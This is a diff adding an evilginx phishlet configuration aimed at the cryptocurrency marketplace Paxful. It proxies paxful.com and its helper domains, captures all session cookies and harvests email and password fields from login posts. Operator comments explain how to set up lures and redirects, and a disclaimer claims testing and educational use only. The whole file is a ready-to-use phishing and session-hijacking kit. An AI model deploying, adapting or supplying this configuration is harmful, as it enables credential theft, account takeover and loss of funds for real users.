@@ -1,0 +1,88 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+# Don't Forget To set "next_lure" Params to your second lure ( Just to redirect user on failed captcha)
+
+# Use This Command To set the domain params from the evilginx command line.
+# Where ID is lure id number, and  "https://mylure.com/tyghh" is the another lure of evilginx for same phishlet.
+# Use shortened URL from the another lure , And then add that shortened url as "next_lure" parameter
+# lures edit params ID next_lure=https://mylure.com/tyghh
+ 
+#Always use shortned url's to add in redirect_url in lures, ( There is a login issue in evilginx, Which sometime fails to redirect if you uses same domain as in hosts list, So use shortened urls of your redirect path)
+
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'paxful.com', session: true, is_landing: true}
+  - {phish_sub: 'sbbe', orig_sub: 'sbbe', domain: 'paxful.com', session: true, is_landing: false}
+  - {phish_sub: 'paxful', orig_sub: 'paxful', domain: 'zendesk.com', session: true, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'geetest.com', session: false, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'geetest.com', session: false, is_landing: false}
+  - {phish_sub: 'q', orig_sub: 'q', domain: 'quora.com', session: false, is_landing: false}
+  - {phish_sub: 'a', orig_sub: 'a', domain: 'quora.com', session: false, is_landing: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'appboycdn.com', session: false, is_landing: false}
+  - {phish_sub: 'zdassets', orig_sub: 'static', domain: 'zdassets.com', session: false, is_landing: false}
+  
+
+
+# https://paxful.com/
+# https://sbbe.paxful.com
+# https://paxful.zendesk.com
+# https://api.geetest.com/
+# https://static.geetest.com
+# https://q.quora.com
+
+# a.quora.com
+# https://js.appboycdn.com
+# https://static.zdassets.com
+
+sub_filters:
+  - {triggers_on: 'paxful.com', orig_sub: '', domain: 'paxful.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: '', domain: 'paxful.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: '', domain: 'paxful.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'sbbe', domain: 'paxful.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'sbbe', domain: 'paxful.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'sbbe', domain: 'paxful.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'paxful', domain: 'zendesk.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'paxful', domain: 'zendesk.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'paxful', domain: 'zendesk.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'api', domain: 'geetest.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'api', domain: 'geetest.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'api', domain: 'geetest.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'static', domain: 'geetest.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'static', domain: 'geetest.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'static', domain: 'geetest.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'q', domain: 'quora.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'q', domain: 'quora.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'q', domain: 'quora.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'a', domain: 'quora.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'a', domain: 'quora.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'a', domain: 'quora.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'js', domain: 'appboycdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'js', domain: 'appboycdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'js', domain: 'appboycdn.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'static', domain: 'zdassets.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'static', domain: 'zdassets.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paxful.com', orig_sub: 'static', domain: 'zdassets.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+auth_tokens:
+  - domain: '.paxful.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/dashboard/.*'    
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'    
+login:
+  domain: 'paxful.com'
+  path: '/'
+    
+
+
+  
